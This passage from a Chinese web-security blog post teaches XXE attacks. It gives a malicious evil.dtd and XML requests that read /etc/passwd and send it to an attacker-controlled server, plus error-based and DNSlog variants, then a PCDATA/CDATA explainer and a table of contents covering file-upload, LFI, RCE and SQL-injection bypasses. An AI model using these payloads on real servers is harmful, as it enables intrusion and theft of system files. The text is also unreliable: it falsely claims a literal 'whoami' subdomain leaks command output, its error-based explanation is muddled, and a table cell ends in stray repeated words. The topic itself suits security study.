<h4 id="利用带外请求获取文件内容"><a href="#利用带外请求获取文件内容" class="headerlink" title="利用带外请求获取文件内容"></a>利用带外请求获取文件内容</h4><p>确认漏洞存在后，下一步就是尝试读取服务器上的文件<br><strong>攻击步骤</strong>：<br><strong>构造恶意 DTD 文件</strong>： 在你的攻击服务器上，创建一个 DTD 文件（例如 <code>evil.dtd</code>），内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://你的vpsip或者dns服务器域名.com/?data=%file;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>构造主 XML 请求：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE a [  </span><br><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;http://你的vpsip或者dns服务器域名/evil.dtd&quot;&gt;  </span><br><span class="line">%p1;  </span><br><span class="line">%send;  </span><br><span class="line">]&gt;  </span><br><span class="line">&lt;test&gt;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p><strong>发送请求：</strong><br>当服务器解析主 XML 文件时，它会首先请求 <code>evil.dtd</code> - 解析 <code>evil.dtd</code> 后，它会读取 <code>file:///etc/passwd</code> 的内容，并将其作为 <code>%file</code> 实体的值 - 最后，它会请求 <code>%send</code> 实体，将文件内容作为 <code>GET</code> 参数发送到你的服务器</p>
<p><strong>接收数据：</strong><br>你会在你的服务器日志中看到类似 <code>GET /?data=root:x:0:0:root:/root:/bin/bash...</code> 的请求，从而获取 <code>/etc/passwd</code> 的内容</p>
<h4 id="利用参数实体获取错误信息"><a href="#利用参数实体获取错误信息" class="headerlink" title="利用参数实体获取错误信息"></a>利用参数实体获取错误信息</h4><p>当无法通过 HTTP GET 请求直接传输数据时，可以利用 XML 解析器的错误信息来带出数据。这种方法通常用于绕过 WAF 或一些过滤<br><strong>攻击步骤：</strong><br><strong>构造恶意 DTD 文件：</strong> 在你的服务器上创建 DTD 文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">p1</span> <span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!ENTITY &amp;#x25; oob SYSTEM &#x27;http://你的vpsip或者dns服务器域名/?data=%file;&#x27;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>构造主 XML 请求：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://your-evil-server.com/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%p1;</span><br><span class="line">%oob;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><strong>发送请求：</strong>   </p>
<p>服务器解析主 XML 时，会首先加载 <code>evil.dtd</code> - 然后，它会尝试解析 <code>%p1</code>，其中包含 <code>%oob</code> 的定义 - 由于 <code>%oob</code> 实体引用了 <code>%file</code>，而 <code>%file</code> 是一个文件内容，当 XML 解析器尝试将其解析为 URL 时，会因为语法错误而失败，并抛出错误信息</p>
<p><strong>这种方法的关键在于，某些 XML 解析器会把完整的错误信息（包括外部实体的内容）带回给客户端，或者将其写入服务器日志。</strong> 虽然不能直接从响应中看到，但可以利用这个特性进行注入</p>
<h4 id="利用-DNSlog-获取数据"><a href="#利用-DNSlog-获取数据" class="headerlink" title="利用 DNSlog 获取数据"></a>利用 DNSlog 获取数据</h4><p>当目标服务器无法出网，或者 HTTP 协议被严格过滤时，DNSlog 是一个非常好的选择</p>
<ul>
<li><strong>攻击步骤：</strong><br><strong>准备 DNSlog 平台：</strong> 获取一个 DNSlog 域名，例如 <code>hacker.dnslog.cn</code><br><strong>构造 XML 请求：</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">p1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://whoami.hacker.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%p1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>发送请求：</strong><br>服务器解析 XML 时，会尝试解析 <code>whoami</code> 命令的输出，并将其作为子域名，向 <code>hacker.dnslog.cn</code> 发起 DNS 查询<br><strong>查看结果：</strong> 你会在 DNSlog 平台的日志中看到类似 <code>www-data.hacker.dnslog.cn</code> 的查询记录，从而获取到 <code>whoami</code> 命令的输出</p>
<h2 id="PCDATA-和-CDATA-的区别"><a href="#PCDATA-和-CDATA-的区别" class="headerlink" title="PCDATA 和 CDATA 的区别"></a>PCDATA 和 CDATA 的区别</h2><p><strong>PCDATA</strong></p>
<p>PCDATA 是 <strong>可解析字符数据</strong>。在XML或HTML中，当解析器遇到 PCDATA 时，它会解析其中的特殊字符。这意味着，如果你的数据中包含 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code> 等字符，解析器会将其视为标签或实体的开始</p>
<p>例如，在XML中：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>这是一个 <span class="symbol">&amp;lt;</span>b<span class="symbol">&amp;gt;</span>粗体<span class="symbol">&amp;lt;</span>/b<span class="symbol">&amp;gt;</span> 文本。<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的 <code>&lt;</code> 会被解析成 <code>&lt;</code>，<code>&gt;</code> 会被解析成 <code>&gt;</code>。如果你在XML元素中直接写入 <code>&lt;script&gt;</code> 标签，解析器会把它当作一个新的节点来处理，而不是纯粹的文本内容。在渗透测试中，如果一个 Web 应用将用户输入作为 PCDATA 处理，但没有进行充分的过滤，攻击者可以注入恶意代码，如 XSS (跨站脚本) 攻击</p>
<p><strong>CDATA</strong></p>
<p>CDATA 是 <strong>不可解析字符数据</strong>。与 PCDATA 相反，解析器会将其中的所有内容都视为纯文本，不会对 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code> 等特殊字符进行解析。CDATA 块通常用 <code>&lt;![CDATA[ ... ]]&gt;</code> 语法来定义</p>
<p>例如，在XML中：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script_code</span>&gt;</span>&lt;![CDATA[</span><br><span class="line">    if (x &lt; 10 &amp;&amp; y &gt; 5) &#123;</span><br><span class="line">      alert(&#x27;Hello!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  ]]&gt;<span class="tag">&lt;/<span class="name">script_code</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>CDATA</code> 块内的所有内容，包括 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，都会被原封不动地当作字符串来处理。即使代码中包含了类似HTML 标签的字符，解析器也不会将它们当作标签来处理。这使得 CDATA 在需要嵌入包含特殊字符的文本（如代码片段、JavaScript 等）时非常有用</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>PCDATA (可解析字符数据)</th>
<th>CDATA (不可解析字符数据)</th>
</tr>
</thead>
<tbody><tr>
<td>解析方式</td>
<td>解析特殊字符（&lt;、&gt;、&amp; 等）</td>
<td>将所有内容视为纯文本，不解析特殊字符</td>
</tr>
<tr>
<td>主要用途</td>
<td>包含普通的、可解析的文本内容</td>
<td>包含代码、脚本或其他含有特殊字符的文本</td>
</tr>
<tr>
<td>攻击风险</td>
<td>高。如果对用户输入处理不当，容易导致 XSS、XML 实体注入等漏洞。</td>
<td>低。由于其内容被视为纯文本，它能有效防止特殊字符被解释为标签或代码。</td>
</tr>
<tr>
<td>攻击场景</td>
<td>当应用程序将用户输入直接放入PCDATA区域，而没有进行充分的转义时，攻击者可以注入  等代码。</td>
<td>除非应用程序对 CDATA 块本身进行了处理或二次解析，否则在 CDATA 内部直接进行注入攻击是无效的。文件上传文件上传文件上传文件上传</td>
</tr>
</tbody></table>
</div><div class="article-licensing box"><div class="licensing-title"><p>文件包含+文件上传+RCE+SQL+XSS+XXE</p><p><a href="https://flypigc.github.io/2025/12/21/从0到1的hacker/">https://flypigc.github.io/2025/12/21/从0到1的hacker/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Sky</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-12-21</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2025-12-21</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=6938dd3470fd5d0337653de1&amp;product=sop" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" referrerpolicy="no-referrer" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" referrerpolicy="no-referrer" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2025/12/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8/"><span class="level-item">未授权漏洞利用</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card" id="comments"><div class="card-content"><h3 class="title is-5">评论</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
            this.page.url = 'https://flypigc.github.io/2025/12/21/%E4%BB%8E0%E5%88%B01%E7%9A%84hacker/';
            this.page.identifier = '2025/12/21/从0到1的hacker/';
        };
        (function() {
            var d = document, s = d.createElement('script');  
            s.src = '//' + 'https-flypigc-github-io' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-3-desktop is-3-widescreen  order-3"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" referrerpolicy="no-referrer" alt="Sky"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sky</p><p class="is-size-6 is-block">网络安全技术研究 | CTF竞赛解析 | 漏洞复现分析 | 红队渗透</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Hunan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">25</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">12</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/flypigc" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/flypigc"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="QQ" href="https://cdn.nlark.com/yuque/0/2025/jpeg/62156892/1766078784961-f9376350-bae6-460e-8b24-81a34063b413.jpeg"><i class="fab fa-qq"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="WeChat" href="https://cdn.nlark.com/yuque/0/2025/jpeg/62156892/1766078785044-f1c1fa04-de3c-42ca-95e2-d48e3410636b.jpeg"><i class="fab fa-weixin"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#文件上传"><span class="level-left"><span class="level-item">1</span><span class="level-item">文件上传</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#绕过手法"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">绕过手法</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#客户端js绕过"><span class="level-left"><span class="level-item">1.1.1.1</span><span class="level-item">客户端js绕过</span></span></a></li><li><a class="level is-mobile" href="#MIME类型绕过"><span class="level-left"><span class="level-item">1.1.1.2</span><span class="level-item">MIME类型绕过</span></span></a></li><li><a class="level is-mobile" href="#文件头内容检测绕过（魔术字节）"><span class="level-left"><span class="level-item">1.1.1.3</span><span class="level-item">文件头内容检测绕过（魔术字节）</span></span></a></li><li><a class="level is-mobile" href="#文件名、路径绕过"><span class="level-left"><span class="level-item">1.1.1.4</span><span class="level-item">文件名、路径绕过</span></span></a></li></ul></ul></li></ul></li><li><a class="level is-mobile" href="#文件包含"><span class="level-left"><span class="level-item">2</span><span class="level-item">文件包含</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#协议"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">协议</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#本地文件包含LFI协议"><span class="level-left"><span class="level-item">2.1.1</span><span class="level-item">本地文件包含LFI协议</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#file"><span class="level-left"><span class="level-item">2.1.1.1</span><span class="level-item">file://</span></span></a></li></ul></li><li><a class="level is-mobile" href="#远程文件包含协议"><span class="level-left"><span class="level-item">2.1.2</span><span class="level-item">远程文件包含协议</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#php-filter"><span class="level-left"><span class="level-item">2.1.2.1</span><span class="level-item">php://filter</span></span></a></li><li><a class="level is-mobile" href="#php-input"><span class="level-left"><span class="level-item">2.1.2.2</span><span class="level-item">php://input</span></span></a></li><li><a class="level is-mobile" href="#data"><span class="level-left"><span class="level-item">2.1.2.3</span><span class="level-item">data://</span></span></a></li><li><a class="level is-mobile" href="#phar"><span class="level-left"><span class="level-item">2.1.2.4</span><span class="level-item">phar://</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#怎么拿shell？"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">怎么拿shell？</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#本地文件LFI包含怎么拿shell"><span class="level-left"><span class="level-item">2.2.1</span><span class="level-item">本地文件LFI包含怎么拿shell</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#日志文件-Getshell"><span class="level-left"><span class="level-item">2.2.1.1</span><span class="level-item">日志文件 Getshell</span></span></a></li><li><a class="level is-mobile" href="#Session-文件-拿shell"><span class="level-left"><span class="level-item">2.2.1.2</span><span class="level-item">Session 文件 拿shell</span></span></a></li><li><a class="level is-mobile" href="#proc-self-environ-拿shell"><span class="level-left"><span class="level-item">2.2.1.3</span><span class="level-item">/proc/self/environ 拿shell</span></span></a></li></ul></li></ul></li></ul></li><li><a class="level is-mobile" href="#RCE"><span class="level-left"><span class="level-item">3</span><span class="level-item">RCE</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#简介"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">简介</span></span></a></li><li><a class="level is-mobile" href="#为什么会造成rce？"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">为什么会造成rce？</span></span></a></li><li><a class="level is-mobile" href="#代码执行命令执行区别"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">代码执行命令执行区别</span></span></a></li><li><a class="level is-mobile" href="#怎么利用其他漏洞去rce"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">怎么利用其他漏洞去rce</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#sql怎么去RCE？"><span class="level-left"><span class="level-item">3.4.1.1</span><span class="level-item">sql怎么去RCE？</span></span></a></li><li><a class="level is-mobile" href="#ssti怎么去rce？"><span class="level-left"><span class="level-item">3.4.1.2</span><span class="level-item">ssti怎么去rce？</span></span></a></li><li><a class="level is-mobile" href="#xxe怎么去rce？"><span class="level-left"><span class="level-item">3.4.1.3</span><span class="level-item">xxe怎么去rce？</span></span></a></li><li><a class="level is-mobile" href="#框架-解析器漏洞类怎么RCE？"><span class="level-left"><span class="level-item">3.4.1.4</span><span class="level-item">框架 / 解析器漏洞类怎么RCE？</span></span></a></li><li><a class="level is-mobile" href="#反序列化"><span class="level-left"><span class="level-item">3.4.1.5</span><span class="level-item">反序列化</span></span></a></li><li><a class="level is-mobile" href="#文件上传-1"><span class="level-left"><span class="level-item">3.4.1.6</span><span class="level-item">文件上传</span></span></a></li><li><a class="level is-mobile" href="#配置-权限错误类"><span class="level-left"><span class="level-item">3.4.1.7</span><span class="level-item">配置 / 权限错误类</span></span></a></li></ul></ul></li><li><a class="level is-mobile" href="#代码执行的函数有什么？"><span class="level-left"><span class="level-item">3.5</span><span class="level-item">代码执行的函数有什么？</span></span></a></li><li><a class="level is-mobile" href="#代码执行的函数有哪些？"><span class="level-left"><span class="level-item">3.6</span><span class="level-item">代码执行的函数有哪些？</span></span></a></li><li><a class="level is-mobile" href="#命令执行的函数有哪些？"><span class="level-left"><span class="level-item">3.7</span><span class="level-item">命令执行的函数有哪些？</span></span></a></li><li><a class="level is-mobile" href="#php-能远程执行的函数有什么？"><span class="level-left"><span class="level-item">3.8</span><span class="level-item">php 能远程执行的函数有什么？</span></span></a></li><li><a class="level is-mobile" href="#RCE-漏洞有什么危害、利用方式及防御措施？"><span class="level-left"><span class="level-item">3.9</span><span class="level-item">RCE 漏洞有什么危害、利用方式及防御措施？</span></span></a></li><li><a class="level is-mobile" href="#通过RCE怎么去拿shell？"><span class="level-left"><span class="level-item">3.10</span><span class="level-item">通过RCE怎么去拿shell？</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#写马"><span class="level-left"><span class="level-item">3.10.1.1</span><span class="level-item">写马</span></span></a></li></ul></ul></li><li><a class="level is-mobile" href="#cat如何绕WAF？"><span class="level-left"><span class="level-item">3.11</span><span class="level-item">cat如何绕WAF？</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#读文件命令替换"><span class="level-left"><span class="level-item">3.11.1.1</span><span class="level-item">读文件命令替换</span></span></a></li></ul></ul></li><li><a class="level is-mobile" href="#绕-php-ini-中-disable-function-的限制？有哪些方法？其中成功率最高的是哪个？为什么？"><span class="level-left"><span class="level-item">3.12</span><span class="level-item">绕 php.ini 中 disable_function 的限制？有哪些方法？其中成功率最高的是哪个？为什么？</span></span></a></li></ul></li><li><a class="level is-mobile" href="#面试篇"><span class="level-left"><span class="level-item">4</span><span class="level-item">面试篇</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#代码执行、命令执行的函数有哪些？"><span class="level-left"><span class="level-item">4.1.1</span><span class="level-item">代码执行、命令执行的函数有哪些？</span></span></a></li><li><a class="level is-mobile" href="#正向-Shell-和反向-Shell-区别？"><span class="level-left"><span class="level-item">4.1.2</span><span class="level-item">正向 Shell 和反向 Shell 区别？</span></span></a></li><li><a class="level is-mobile" href="#如何从非交互的-Shell-提升为交互-Shell？"><span class="level-left"><span class="level-item">4.1.3</span><span class="level-item">如何从非交互的 Shell 提升为交互 Shell？</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Windows系统"><span class="level-left"><span class="level-item">4.1.3.1</span><span class="level-item">Windows系统</span></span></a></li><li><a class="level is-mobile" href="#Linux系统"><span class="level-left"><span class="level-item">4.1.3.2</span><span class="level-item">Linux系统</span></span></a></li></ul></li></ul></ul></li><li><a class="level is-mobile" href="#java-rce篇"><span class="level-left"><span class="level-item">5</span><span class="level-item">java-rce篇</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Java反序列化漏洞导致RCE的核心原理，并以Apache-Commons-Collections-3-x为例，描述攻击链的构造过程（需包含关键类和方法）"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">Java反序列化漏洞导致RCE的核心原理，并以Apache Commons Collections 3.x为例，描述攻击链的构造过程（需包含关键类和方法）</span></span></a></li><li><a class="level is-mobile" href="#在Spring框架中，如何通过SpEL（Spring-Expression-Language）注入实现RCE？请结合CVE-2022-22963漏洞说明利用条件及Payload构造。"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">在Spring框架中，如何通过SpEL（Spring Expression Language）注入实现RCE？请结合CVE-2022-22963漏洞说明利用条件及Payload构造。</span></span></a></li><li><a class="level is-mobile" href="#假设目标系统对用户输入的RCE-Payload进行了黑名单过滤（如禁止Runtime、ProcessBuilder等关键词），请列举三种绕过方式并举例说明。"><span class="level-left"><span class="level-item">5.3</span><span class="level-item">假设目标系统对用户输入的RCE Payload进行了黑名单过滤（如禁止Runtime、ProcessBuilder等关键词），请列举三种绕过方式并举例说明。</span></span></a></li><li><a class="level is-mobile" href="#如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。"><span class="level-left"><span class="level-item">5.4</span><span class="level-item">如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。</span></span></a></li><li><a class="level is-mobile" href="#如何绕过Java-Security-Manager的沙箱限制实现RCE？请举例说明。"><span class="level-left"><span class="level-item">5.5</span><span class="level-item">如何绕过Java Security Manager的沙箱限制实现RCE？请举例说明。</span></span></a></li><li><a class="level is-mobile" href="#Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。"><span class="level-left"><span class="level-item">5.6</span><span class="level-item">Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。</span></span></a></li></ul></li><li><a class="level is-mobile" href="#SQL注入"><span class="level-left"><span class="level-item">6</span><span class="level-item">SQL注入</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#WAF绕过"><span class="level-left"><span class="level-item">6.1</span><span class="level-item">WAF绕过</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#post和get都做了防注入，用什么方法绕"><span class="level-left"><span class="level-item">6.1.1.1</span><span class="level-item">post和get都做了防注入，用什么方法绕</span></span></a></li><li><a class="level is-mobile" href="#单引号过滤绕过"><span class="level-left"><span class="level-item">6.1.1.2</span><span class="level-item">单引号过滤绕过</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#双引号"><span class="level-left"><span class="level-item">6.1.1.2.1</span><span class="level-item">双引号</span></span></a></li><li><a class="level is-mobile" href="#十六进制"><span class="level-left"><span class="level-item">6.1.1.2.2</span><span class="level-item">十六进制</span></span></a></li><li><a class="level is-mobile" href="#宽字节"><span class="level-left"><span class="level-item">6.1.1.2.3</span><span class="level-item">宽字节</span></span></a></li><li><a class="level is-mobile" href="#反斜线-绕过addslashes"><span class="level-left"><span class="level-item">6.1.1.2.4</span><span class="level-item">反斜线 \ 绕过addslashes</span></span></a></li><li><a class="level is-mobile" href="#char-函数绕过"><span class="level-left"><span class="level-item">6.1.1.2.5</span><span class="level-item">char()函数绕过</span></span></a></li><li><a class="level is-mobile" href="#使用like语句绕过"><span class="level-left"><span class="level-item">6.1.1.2.6</span><span class="level-item">使用like语句绕过</span></span></a></li></ul></li><li><a class="level is-mobile" href="#盲注过滤if绕过手法"><span class="level-left"><span class="level-item">6.1.1.3</span><span class="level-item">盲注过滤if绕过手法</span></span></a></li><li><a class="level is-mobile" href="#and和or被过滤怎么绕过"><span class="level-left"><span class="level-item">6.1.1.4</span><span class="level-item">and和or被过滤怎么绕过</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#和"><span class="level-left"><span class="level-item">6.1.1.4.1</span><span class="level-item">&amp;&amp;和||</span></span></a></li><li><a class="level is-mobile" href="#利用-、、not-等操作符"><span class="level-left"><span class="level-item">6.1.1.4.2</span><span class="level-item">利用!、&lt;&gt;、not 等操作符</span></span></a></li><li><a class="level is-mobile" href="#利用union-select进行盲注"><span class="level-left"><span class="level-item">6.1.1.4.3</span><span class="level-item">利用union select进行盲注</span></span></a></li><li><a class="level is-mobile" href="#利用if-函数的替代品"><span class="level-left"><span class="level-item">6.1.1.4.4</span><span class="level-item">利用if()函数的替代品</span></span></a></li><li><a class="level is-mobile" href="#利用其他查询特性"><span class="level-left"><span class="level-item">6.1.1.4.5</span><span class="level-item">利用其他查询特性</span></span></a></li></ul></li><li><a class="level is-mobile" href="#SQL注入无回显利用DNSLOG如何构造"><span class="level-left"><span class="level-item">6.1.1.5</span><span class="level-item">SQL注入无回显利用DNSLOG如何构造</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#MySQL-MariaDB"><span class="level-left"><span class="level-item">6.1.1.5.1</span><span class="level-item">MySQL/MariaDB</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#load-file"><span class="level-left"><span class="level-item">6.1.1.5.1.1</span><span class="level-item">load_file</span></span></a></li><li><a class="level is-mobile" href="#dns-reverse-和benchmark"><span class="level-left"><span class="level-item">6.1.1.5.1.2</span><span class="level-item">dns_reverse()和benchmark()</span></span></a></li></ul></li><li><a class="level is-mobile" href="#SQL-Server"><span class="level-left"><span class="level-item">6.1.1.5.2</span><span class="level-item">SQL Server</span></span></a></li><li><a class="level is-mobile" href="#PostgreSQL"><span class="level-left"><span class="level-item">6.1.1.5.3</span><span class="level-item">PostgreSQL</span></span></a></li></ul></li><li><a class="level is-mobile" href="#过滤逗号"><span class="level-left"><span class="level-item">6.1.1.6</span><span class="level-item">过滤逗号</span></span></a></li><li><a class="level is-mobile" href="#SQL-延时盲注-sleep-被禁用怎么绕过"><span class="level-left"><span class="level-item">6.1.1.7</span><span class="level-item">SQL 延时盲注 sleep() 被禁用怎么绕过</span></span></a></li><li><a class="level is-mobile" href="#outfile被过滤怎么绕"><span class="level-left"><span class="level-item">6.1.1.8</span><span class="level-item">outfile被过滤怎么绕</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#dumpfile"><span class="level-left"><span class="level-item">6.1.1.8.1</span><span class="level-item">dumpfile()</span></span></a></li><li><a class="level is-mobile" href="#利用日志文件"><span class="level-left"><span class="level-item">6.1.1.8.2</span><span class="level-item">利用日志文件</span></span></a></li></ul></li></ul></ul></li><li><a class="level is-mobile" href="#报错注入函数"><span class="level-left"><span class="level-item">6.2</span><span class="level-item">报错注入函数</span></span></a></li><li><a class="level is-mobile" 